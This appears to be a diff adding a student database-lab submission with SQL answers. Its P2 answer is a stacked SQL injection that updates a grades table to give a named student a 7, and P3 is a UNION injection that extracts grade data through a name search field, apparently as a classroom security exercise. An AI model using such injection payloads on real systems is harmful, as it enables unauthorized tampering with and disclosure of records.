@@ -1,0 +1,15 @@
+Lab6
+Integrantes: José Astorga
+             Lukas Pavez
+
+P0
+select nombres, apellido_p, apellido_m, mes, anho, total from uchile.transparencia where apellido_p='Hogan';
+
+select nota, nombre from nota.bdd2018 where nombre='Pavez Bahamondes, Lukas Dario';
+
+P2
+Hogan'; update nota.bdd2018 set nota=7 where nombre='Pavez Bahamondes, Lukas Dario'; --
+
+
+P3
+Hogan' and false union select nombre as nombres, to_char(nota, '999D9'), null, null, null, null from nota.bdd2018 where nombre like 'Pavez%
